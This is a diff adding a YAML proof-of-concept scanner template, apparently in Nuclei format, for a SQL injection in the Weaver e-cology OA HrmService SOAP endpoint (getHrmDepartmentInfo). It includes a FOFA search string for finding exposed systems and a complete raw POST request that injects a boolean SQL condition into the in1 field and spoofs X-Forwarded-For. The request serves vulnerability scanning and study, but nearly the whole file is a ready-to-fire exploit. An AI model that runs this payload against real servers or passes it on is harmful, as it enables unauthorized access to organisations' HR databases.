@@ -1,0 +1,62 @@
+id: poc-sieracg2pgq57gi1
+info:
+  name: 泛微getHrmDepartmentInfo存在sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sieracg2pgq57gi1'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sieracg2pgq57gi1
+    fofa: app="泛微-OA（e-cology）"
+http:
+- raw:
+  - 'POST /services/HrmService HTTP/1.1
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+    SOAPAction: urn:weaver.hrm.webservice.HrmService.getHrmDepartmentInfo
+
+    Content-Type: text/xml;charset=UTF-8
+
+    Host: {{Hostname}}
+
+    Content-Length: 427
+
+    X-Forwarded-For: 127.0.0.1
+
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrm="http://localhost/services/HrmService">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <hrm:getHrmDepartmentInfo>
+
+    <!--type: string-->
+
+    <hrm:in0>gero et</hrm:in0>
+
+    <!--type: string-->
+
+    <hrm:in1>1)AND(db_name()like''ec%''</hrm:in1>
+
+    </hrm:getHrmDepartmentInfo>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
